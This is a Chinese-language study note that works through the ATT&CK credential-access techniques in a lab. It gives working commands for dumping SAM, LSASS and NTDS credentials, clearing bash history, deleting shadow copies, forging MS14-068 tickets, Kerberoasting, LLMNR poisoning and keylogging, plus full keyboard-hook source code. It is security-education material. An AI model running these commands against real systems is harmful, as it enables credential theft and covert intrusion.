# Credential Access

## Account Manipulation-T1098

账户操纵主要提到了修改权限，修改凭据，添加或更改权限组等能够进行的账户操作，更多情况下认为应该放在权限维持下面，并且这一项可以作为一个

## Bash History-T1139

Bash使用“history”实用程序跟踪用户在命令行上键入的命令，有可能能够看到历史记录保存的此前登录系统的密码（亲身遇到过）

查看：

```bash
cat ~/.bash_history
history
```

**隐藏命令：**

```bash
set +o history 不会将任何当前会话写入日志。可以在会话期间任何时间运行，并隐藏所有命令。
set -o history 重启日志记录，但是会记录 set 命令，所以会发生一些明显的变化。
history -c 彻底清除历史（存在一个问题，就是bash_history文件其实还存在，ssh退出再上去依然能看到，所以还是把bash_history文件删除）
```

## Brute Force-T1110

主要说了一些暴力破解的方式，而工具多种多样，一般情况下的爆破可以基于短时间内访问失败次数进行检测。比较有名的就是Hydra了。

![1574317122700](Credential%20Access.assets/1574317122700.png)

## Credential Dumping-T1003

### SAM(Security Accounts Manager)

SAM包含主机的本地账户的HAS值（每一台主机中都存在一个SAM），利用工具：

​    **pwdumpx.exe**

​        下载了pwdump7，直接执行exe文件即可

![1574317247983](Credential%20Access.assets/1574317247983.png)

​    **gsecdump**

​        gsecdump -a 查看SAM

​    **Mimikatz**

```
privilege::debug(切换至管理员权限)
token::elevate
lsadump::sam
```

![1574317265058](Credential%20Access.assets/1574317265058.png)

​    **secretsdump.py**

​    **Invoke-PowerDump.ps1**

```
Import-module Invoke-PowerDump.ps1
Invoke-PowerDump
```

![1574317328740](Credential%20Access.assets/1574317328740.png)

**Reg从注册表中提取SAM**

​    命令行执行：

```
reg save HKLM\sam c:\sam
reg save HKLM\system c:\system
```

​    这种方式提取的文件是乱码，明文需要通过samdump2或者mimikatz再提

![1574317367660](Credential%20Access.assets/1574317367660.png)

```
lsadump::sam /sam:sam /system:system
```

![1574317383054](Credential%20Access.assets/1574317383054.png)

### Local Security Authority (LSA) 

本地安全机构（LSA）是受Microsoft Windows保护的子系统，它是Windows客户端身份验证体系结构的一部分，该体系结构对本地计算机进行身份验证并创建登录会话。

LSA是一个认证机制,在负责Lsa的windows进程lsass中实际存储了系统的账户密码明文和加密过的HASH值。

### NTDS

NTDS不同于SAM，SAM保存本地，NTDS保存在域控，保存了域内所有的HASH

**卷影复制**

卷影副本也称为快照，是存储在 Data Protection Manager (DPM) 服务器上的副本的时间点副本。副本是文件服务器上单个卷的受保护共享、文件夹和文件的完整时间点副本。

（勒索软件通常会删除卷影副本：C:\Windows\Sysnative\vssadmin.exe"Delete Shadows /All /Quiet）

![1574317582705](Credential%20Access.assets/1574317582705.png)

**secretsdump.py**

secretsdump.py在这里的作用是从已经导出的ntds.dit文件中导出明文。Mimikatz也可以达到相同的效果

```
python secretsdump.py -ntds /demo/ntds/ntds.dit -system /demo/ntds/SYSTEM LOCAL
```

![1574317609798](Credential%20Access.assets/1574317609798.png)    

**ntdsutil.exe**

可以直接通过ntdsutil命令导出ntds.dit文件

```
ntdsutil "ac i ntds" "ifm" "create full c:temp" q q
```

![1574317634601](Credential%20Access.assets/1574317634601.png)

**Invoke-NinjaCopy.ps1**

使用命令

```
Import-Module .\invoke-ninjacopy.ps1
Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive
Invoke-NinjaCopy -Path C:\Windows\System32\config\SYSTEM -LocalDestination .\system.hive
```

导出的文件同样需要通过类似于mimikatz这样的工具导出为明文。

还有像Ntdsdump之类的工具，不再一一介绍。

### Plaintext Credentials

比如使用mimikatz和procdump组合使用导出系统中的密码

也可以直接使用mimkatz命令:

```
privilege::debug
sekurlsa::logonPasswords
```

![1574317707084](Credential%20Access.assets/1574317707084.png)

上图是在windows server 2008中的截图，在windows server 2012中lsass中已经不存储明文。

![1574318018748](Credential%20Access.assets/1574318018748.png)

## Credentials in Files-T1081

提到了关于文件中保存的凭据或者密码文件

包括电子邮件客户端、谷歌浏览器、等，涉及到的一些工具暂未找到

其中提到了Get-GPPPassword.ps1

同时也可以使用命令快速搜索系统文件中的密码

例，通过findstr搜索带有password字段的文件：

```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
```

![1574318204038](Credential%20Access.assets/1574318204038.png)

## Credentials in Registry-T1214

可以通过命令

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

分别查看本地机器和当前用户的含有password的项

## Exploitation for Credential Access-T1212

攻击者利用操作系统漏洞，或者是身份验证机制的错误来进行攻击。偏思路型，原文中举了几个例子，其中一个是MS14-068，直接使用利用工具可以申请具有域管理员权限的票据

```
MS14-068.exe -u normal@test.com -s S-1-5-21-1406004368-3818689962-3591297438-1105 -d 192.168.3.100 -p Server1
```

![1574318277629](Credential%20Access.assets/1574318277629.png)

## Forced Authentication-T1187

当Windows系统尝试连接到SMB资源时，它将自动尝试进行身份验证，并将当前用户的凭据信息发送到远程系统。

当SMB被阻止或者失败时，WebDAV会做为备用协议。WebDAV是HTTP的扩展，通常通过TCP端口80和443运行。

攻击者可以利用这种方式诱导受害者访问其他资源。

例：

通过页面（钓鱼邮件等）中嵌入的代码发起SMB请求，然后进行SMB中继操作，或者用于检索文件

![1574318337349](Credential%20Access.assets/1574318337349.png)

## Hooking-T1179

类似于进程注入，攻击者可以使用钩子在另一个进程的上下文中加载和执行恶意代码，从而屏蔽执行过程，同时还允许访问进程的内存和可能的特权。通过正常使用调用功能时，使用HOOK机制能够通过连续调用来提供持久性，或者是抓取键盘输入，从而获取被攻击着的一些账号密码。

这里直接使用逆向工程核心原理中的HOOK教程的代码来进行演示HOOK技术，拿键盘输入举例，首先了解一下在键盘输入时常规的Windows消息流：

```
1、 发生键盘输入事件时，WM_KEYDOWN消息被添加到[OS message queue]。
2、 OS判断哪个应用程序中发生了事件，然后从[OS message queue]取出消息，添加到相应应用程序的[application message queue]中。
3、 应用程序（如记事本）监视自身的[application message queue]，发现新添加的WM_KEYDOWN消息后，调用相应事件的处理程序来进行处理。
```

![1574318455954](Credential%20Access.assets/1574318455954.png)

从上图可以更形象的来理解这个过程。

下面直接利用原书中的示例代码来进行实验，我们通过编写的钩子（HOOK）文件来拦截notepad.exe的输入，首先使用C++生成一个HookMain.exe文件，源代码为HookMain.cpp:

```c++
#include "stdio.h"
#include "conio.h"
#include "windows.h"

#define	DEF_DLL_NAME "KeyHook.dll"
#define	DEF_HOOKSTART "HookStart"
#define	DEF_HOOKSTOP "HookStop"

typedef void (*PFN_HOOKSTART)();
typedef void (*PFN_HOOKSTOP)();

void main()
{
	HMODULE hDll = NULL;
	PFN_HOOKSTART HookStart = NULL;
	PFN_HOOKSTOP HookStop = NULL;
	char ch = 0;

	hDll = LoadLibraryA(DEF_DLL_NAME);
    if( hDll == NULL )
    {
        printf("LoadLibrary(%s) failed!!! [%d]", DEF_DLL_NAME, GetLastError());
        return;
    }

	HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);
	HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);
	HookStart();
	printf("press 'q' to quit!\n");
	while( _getch() != 'q' )	;
	HookStop();
	FreeLibrary(hDll);
}

```

然后再生成一个DLL文件，名为KeyHook.dll，源代码为KeyHook.cpp:

```c++
#include "stdio.h"
#include "windows.h"

#define DEF_PROCESS_NAME "notepad.exe"

HINSTANCE g_hInstance = NULL;
HHOOK g_hHook = NULL;
HWND g_hWnd = NULL;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
{
	switch( dwReason )
	{
        case DLL_PROCESS_ATTACH:
			g_hInstance = hinstDLL;
			break;
        case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	char szPath[MAX_PATH] = {0,};
	char *p = NULL;
	if( nCode >= 0 )
	{
		if( !(lParam & 0x80000000) )
		{
			GetModuleFileNameA(NULL, szPath, MAX_PATH);
			p = strrchr(szPath, '\\');
			if( !_stricmp(p + 1, DEF_PROCESS_NAME) )
				return 1;
		}
	}
	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

#ifdef __cplusplus
extern "C" {
#endif
	__declspec(dllexport) void HookStart()
	{
		g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);
	}
	__declspec(dllexport) void HookStop()
	{
		if( g_hHook )
		{
			UnhookWindowsHookEx(g_hHook);
			g_hHook = NULL;
		}
	}
#ifdef __cplusplus
}
#endif
```

将代码编译成对应的exe和dll文件之后我们进行测试。

首先打开HookMain.exe程序，然后程序会自动调用对应的DLL文件，然后使用ProcessExplorer工具查看发现此时notepad.exe还没有调用Keyhook.dll

![1574318618698](Credential%20Access.assets/1574318618698.png)

在notepad.exe中尝试输入字母发现并不能输入，再次Search发现notepad已经调用了KeyHook.dll文件，键盘的输入被拦截。

![1574318631944](Credential%20Access.assets/1574318631944.png)

这是一个简单的消息钩子，使用的API是SetWindowsHookEx()这个API，在使用SetWindowsHookEx()设置好钩子之后，在某个进程中生成指定消息时，操作系统会将相关的DLL文件强制注入到响应进程，然后调用注册的钩子过程。攻击者可以通过钩子获取键盘输入、执行恶意代码、等等操作，同时还允许访问进程的内存和可能的特权。

## Input Capture-T1056

主要提到了键盘记录（实际上和上面提到的Hooking是相同的原理），和门户安装代码远程捕获用户凭据，主要关键点是用户输入的内容

提到了一些黑客使用的工具。

比如Cobalt Strike、Chopstick、gh0st、powersploit中的Get-Keystrokes等…工具非常多

这里使用Get-Keystrokes来举例，使用命令运行脚本之后，在屏幕的其他位置敲击键盘输入字符时发现Get-Keystrokes记录了输入的内容：

```
. .\Get-Keystrokes.ps1
Get-Keystrokes
```

![1574318973123](Credential%20Access.assets/1574318973123.png)

## Input Prompt-T1141

伪造页面诱导受害者输入账号密码，算是一种思路而不是一种具体的技术，主要是伪造比如银行、WIFI等页面。

## Kerberoasting-T1208

批量申请TGS票据然后进行爆破

```
Import-module Invoke-Kerberoast.ps1
Invoke-kerberoast –outputformat hashcat | fl
```

![1574319151262](Credential%20Access.assets/1574319151262.png)

然后将得到的内容使用hashcat工具爆破

```
hashcat64.exe –m 13100 test1.txt password.list --force
```

![1574319165232](Credential%20Access.assets/1574319165232.png)

## Keychain-T1142

MACOS

## LLMNR/NBT-NS Poisoning-T1171

攻击者通过响应LLMNR流量来欺骗请求发起者。可以结合wpad进行中间人攻击，或者是获取NTLM HASH进行爆破。

所用工具：Pupy、Responder、MSF

例：

```
python2 Responder.py -I eth0
```

![1574319221984](Credential%20Access.assets/1574319221984.png)

## Network Sniffing-T1040

网络嗅探是指使用系统上的网络接口来监视或捕获通过有线或无线连接发送的信息。

方式多种多样上文中说的Responder也是其中一种方式。工具还提到了Responder、Impacket等等。

## 未完成Password Filter DLL-T1174

Windows中组策略中存在密码复杂度的配置

gpedit.msc -> 本地计算机策略 -> 计算机配置 -> Windows设置 -> 安全设置 -> 帐户策略 -> 密码策略 -> 密码必须符合复杂性要求

如果密码策略满足不了对密码复杂度的要求，则可以使用Password Filter DLL进一步提高密码复杂度。

## Private Keys-T1145

通过搜集系统私钥来进行攻击，比如Linux中通过私钥登录SSH服务。

Mimikatz通过windowAPI来提取密钥

## Securityd Memory-T1167

MACOS

## Steal Web Session Cookie-T1539

说到窃取Cookie的方式实际上是很多的，比如通过存储型的XSS，在ATT&CK的官网中还提到了中间人，不管是通过什么样的方式，最终的目的都是为了获取Cookie。

这里我想到了几个月前写的一个文章，关于Windows下利用DPAPI本地窃取Cookie的方式，主要是通过DPAPI（Data Protection Application Programming Interface）的机制来获取其他用户的Cookie。

篇幅太长，所以不写在这里了，链接：

## Two-Factor Authentication Interception-T1111

双因素认证的拦截，描述了攻击者可能通过一些键盘记录之类的方式来获取双因素认证中的密钥。不感兴趣懒得复现。
